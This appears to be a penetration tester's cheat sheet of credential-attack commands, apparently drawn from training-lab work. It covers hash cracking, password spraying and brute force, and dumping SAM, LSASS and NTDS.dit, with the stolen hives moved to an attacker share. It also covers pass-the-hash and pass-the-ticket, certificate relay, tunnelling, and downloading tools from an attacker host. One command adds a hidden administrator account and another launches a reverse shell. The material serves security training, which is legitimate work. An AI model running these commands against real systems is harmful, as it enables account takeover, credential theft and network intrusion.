# Password Attacks

### John The Ripper 

```shell
  echo -n "password" | sha256sum
  john --single <filename>
  john --wordlist=<wordlist_file> <hash_file>
  
  hashid -j <hash>
```

---

### Hashcat

```shell
  hashcat -a 0 -m 0 <hash> <wordlist>
  hashcat -a 0 -m 0 <hash> <wordlist> -r <rule>
  hashcat -a 3 -m 0 <hash> <mask / '?u?l?l?l?l?d?s'>
  hashid -m '<hash>'
```

---

### Password List

```shell
  cat << EOF >> password.list
  cat << EOF >> custom.rule
  hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
  hashcat -a 0 -m 0 <hash> mut_password.list
```

---

### Protected Files

```shell
  for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
  grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null #ssh keys
  cat /home/jsmith/.ssh/SSH.private
  ssh-keygen -yf ~/.ssh/id_ed25519 #If no prompt for passprashe we are good

  #SSH keys cracking
  ssh2john.py SSH.private > ssh.hash
  john --wordlist=rockyou.txt ssh.hash
  john ssh.hash --show

  # Password protected documents
  office2john.py Protected.docx > protected-docx.hash
  john --wordlist=rockyou.txt protected-docx.hash
  john protected-docx.hash --show

  #  Pdf
  pdf2john.py PDF.pdf > pdf.hash
  john --wordlist=rockyou.txt pdf.hash
  john pdf.hash --show
```

---

### Protected Archives

```shell
  zip2john ZIP.zip > zip.hash
  john --wordlist=rockyou.txt zip.hash

  for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

  # bitlocker
  bitlocker2john -i Backup.vhd > backup.hashes
  grep "bitlocker\$0" backup.hashes > backup.hash
  hashcat -a 0 -m 22100 '<hash/hashfile>' /usr/share/wordlists/rockyou.txt
```

```shell
  sudo mkdir -p /media/bitlocker
  sudo mkdir -p /media/bitlockermount

  sudo losetup -f -P Backup.vhd
  losetup -all
  sudo apt-get install dislocker
  sudo dislocker /dev/loop0p1 -u<cracked_username> -- /media/bitlocker
  sudo ls -la /media/bitlocker
  sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

  cd /media/bitlockermount/
  ls -la
  
  sudo umount /media/bitlockermount
  sudo umount /media/bitlocker
```

---

### Network Services

```shell
  sudo apt-get -y install netexec
  netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

  #attacks
  netexec winrm 10.129.42.197 -u user.list -p password.list
  hydra -L user.list -P password.list ssh://<ip>
  hydra -L user.list -P password.list rdp://<ip>
  hydra -L user.list -P password.list smb://<ip>

  msfconsole: auxiliary/scanner/smb/smb_login

  #Logging in after
  ssh <username>@<ip>
  netexec smb 10.129.42.197 -u "user" -p "password" --shares
  smbclient -U user \\\\10.129.42.197\\SHARENAME
  evil-winrm -i <target-IP> -u <username> -p <password>
  xfreerdp /v:<target-IP> /u:<username> /p:<password>
  
```

---

### Spraying, Stuffing, Defaults

```shell
  netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
  hydra -C user_pass.list ssh://10.100.38.23

  pip3 install defaultcreds-cheat-sheet
  creds search <protocol/app>
```

---

### Extraxting from windows machines

```shell
  reg.exe save hklm\sam C:\sam.save
  reg.exe save hklm\system C:\system.save
  reg.exe save hklm\security C:\security.save

  sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
  move sam.save \\<ip>\CompData
  move security.save \\<ip>\CompData
  move system.save \\<ip>\CompData

  python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
  sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

  #DCC2 Hashes - hklm/security
  hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

  #DPAPI
  mimikatz.exe
  dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

  netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
  netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
  
```

---

### Dumping LSASS

```shell
  tasklist /svc

  Get-Process lsass

  rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp ful
  pypykatz lsa minidump /home/peter/Documents/lsass.dmp
  sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

---

### Windows Vault & Credentials

```shell
  whoami
  cmdkey /list
  runas /savecred /user:SRV01\mcharles cmd

  mkdir www; cd www; wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
  python3 -m http.server
  certutil -urlcache -split -f "http://<ip>:8000/lazagne.exe" .\lazagne.exe
  C:\Windows\Temp\lazagne.exe all

  mimikatz.exe
  privilege::debug
  sekurlsa::credman
```

---

### AD and NTDS.dit

```shell
  git clone https://github.com/urbanadventurer/username-anarchy
  wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
  
  ./username-anarchy -i /home/ltnbob/names.txt 
  ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain/-d inlanefreight.local names.txt
  ./kerbrute_linux_amd64 bruteuser --dc 10.129.201.57 --domain/-d inlanefreight.local <wordlist> <username>
  netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

  # NTDS.dit
  evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
  net localgroup
  net user bwilliamson
  vssadmin CREATE SHADOW /For=C:
  cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit .\NTDS.dit
  cmd.exe /c reg.exe save hklm\SYSTEM .\SYSTEM
  cmd.exe /c move .\NTDS.dit \\10.10.15.30\CompData
  cmd.exe /c move .\SYSTEM \\10.10.15.30\CompData
  impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

  #Login
  netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
  sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
  evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b # Pass the hash
```

---

### Windows Credential Hunting

```shell
  start LaZagne.exe all
  findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
  findstr /SIM /C:"gitlab" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

---

### Linux Auth

```shell
  sudo cp /etc/passwd /tmp/passwd.bak 
  sudo cp /etc/shadow /tmp/shadow.bak 
  unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
  hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.crackedecho 
```

---

### Linux Credential Hunting

```shell
  for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
  for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
  for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
  find /home/* -type f -name "*.txt" -o ! -name "*.*"
  for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
  cat /etc/crontab
  grep 'pass' -r /home/ 2>/dev/null
  tail -n5 /home/*/.bash*
  for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

  sudo python3 mimipenguin.py

  https://github.com/AlessandroZ/LaZagne/blob/master/Linux/laZagne.py
  sudo python2.7 laZagne.py all

  ls -l .mozilla/firefox/ | grep default
  cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
  
  wget -q https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py
  python3.9 firefox_decrypt.py
  python3 laZagne.py browsers
  
```

---

### Credential Hunting in network shares

```shell
  #windows
  wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.198/Snaffler.exe
  Snaffler.exe -s -n -u
  Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
  et-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"

  #linux
  docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
  nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
  nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --spider HR --content --pattern "Administrator"


  smbclient //<ip>/<share_name> -U <username>
```

---

### Pass the Hash

```shell
  mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit #rrc4 == ntlm hash
  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

  netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
  netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
  nxc smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa --ntds --user Administrator
  
  evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

  # To allow the pass the hash for the rdp configure this
  nxc smb STMIP -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
  xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

  powershell -ep bypass

  cd C:\tools\Invoke-TheHash\
  Import-Module .\Invoke-TheHash.psd1
  Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
  Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <base64_encoded_reverse shell>"
  
.\nc.exe -lvnp 8001 # +revshells.com
```

---

### Pass the ticket

```shell

  #Get the keys
  mimikatz.exe
  privilege::debug
  sekurlsa::tickets /export
  sekurlsa::ekeys

  mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" # dir to list the captured tickets

  # Export the keys
  Rubeus.exe dump /nowrap

  #Pass the key
  sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

  # Pass the key
  Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

  # Pass the ticket
  Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
  Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
  kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
  kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi" 

  dir \\DC01.inlanefreight.htb\john #access theh found stuff

  #Convert kribi to base64 then paste the kirbi ticket
  [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
  Rubeus.exe ptt /ticket:<base64_encoded_ticket>/

  #Powershell remoting
  Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
  Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
  powershell
  Enter-PSSession -ComputerName DC01
```

---

### Pass the ticket from linux


```shell
  # Linux auth via port forwarding
  ssh david@inlanefreight.htb@10.129.204.23 -p 2222

  realm list
  ps -ef | grep -i "winbind\|sssd"
  find / -name *keytab* -ls 2>/dev/null
  crontab -l
  env | grep -i krb5
  ls -la /tmp | grep krb5
  klist -k -t /opt/specialfiles/carlos.keytab
  klist
  cp <path_to_krb5cc_file> .
  export KBR5CCNAME=/root/<krb5cc_filename>
  smbclient //dc01/carlos -k -c ls

  wget https://github.com/sosdave/KeyTabExtract
  python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab # .keytab and .kt files
  cat /etc/hosts
  cat /etc/proxychains.conf

  kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
  smbclient //dc01/linux01 -k -c 'get flag.txt' -no-pass
```

```shell
  # Chisel
  wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
  gzip -d chisel_1.7.7_linux_amd64.gz
  mv chisel_* chisel && chmod +x ./chisel
  sudo ./chisel server --reverse

  xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
  c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

  export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
  proxychains evil-winrm -i dc01 -r inlanefreight.htb
  impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

  wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
  /opt/linikatz.sh
```

---

### Pass the certifcate

```shell
    
  impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
  impacket-ntlmrelayx -t http://<certificate_authority_server_ip>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

  wget -q https://raw.githubusercontent.com/dirkjanm/krbrelayx/refs/heads/master/printerbug.py
  python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@<domain_controller_ip> 10.10.16.12

  git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker/pywhisker
  pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
  
  git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
  python3 -m venv .venv
  source .venv/bin/activate
  pip3 install -r requirements.txt
  pip3 install -I git+https://github.com/wbond/oscrypto.git
  python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
  python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

  sudo apt-get install krb5-user -y
  sudo nano /etc/krb5.conf #point defaualt realm and define it under the realms as kdc = <dc_name>
  export KRB5CCNAME=/tmp/dc.ccache

  echo "<dc_ip> <dc_full_name>" | sudo tee -a /etc/hosts
  impacket-secretsdump -k -no-pass -dc-ip STMIP -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

  evil-winrm -i dc01.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
```

---

### Chisel and ligolo-ng

```shell
    # Chisel
  wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
  gzip -d chisel_1.7.7_linux_amd64.gz
  mv chisel_* chisel && chmod +x ./chisel
  sudo ./chisel server --reverse

  # Ligolo-ng
  wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
  wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
  tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
  tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

  python3 -m http.server
  wget http://<attacker_ip>:8000/agent

  sudo ./proxy -selfcert
  chmod +x ./agent ; ./agent -connect <attack_ip>:11601 --ignore-cert
  session
  autoroute
  cat << EOF > hosts
  nxc rdp hosts -u hwilliam -p 'dealer-screwed-gym1'
  nxc winrm hosts -u hwilliam -p 'dealer-screwed-gym1'
  xfreerdp /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' /dynamic-resolution /drive:linux,.

```
